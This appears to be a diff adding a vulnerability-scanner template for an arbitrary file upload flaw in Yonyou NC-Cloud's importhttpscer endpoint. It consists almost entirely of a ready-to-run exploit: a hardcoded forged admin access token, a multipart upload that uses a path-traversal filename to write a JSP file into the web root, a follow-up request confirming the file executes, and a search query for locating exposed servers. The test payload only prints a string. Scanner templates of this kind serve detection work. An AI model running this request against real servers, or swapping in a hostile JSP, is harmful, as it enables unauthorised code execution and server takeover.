@@ -1,0 +1,39 @@
+## id: VEID-2024-0508
+## name: 用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: 用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞
+## fofa-query: app="用友-NC-Cloud"
+## verification: true
+
+
+
+POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
+Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0
+
+--fd28cb44e829ed1c197ec3bc71748df0
+Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/a.jsp"
+
+<%out.println(hello veil);%>
+--fd28cb44e829ed1c197ec3bc71748df0--
+
+
+#@ matcher: status_code == 200
+
+---
+
+GET //a.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: e9b0d1e6814fb6bc5631abfab110f0b043e72a1519935dc0ec2423c2a75ee384
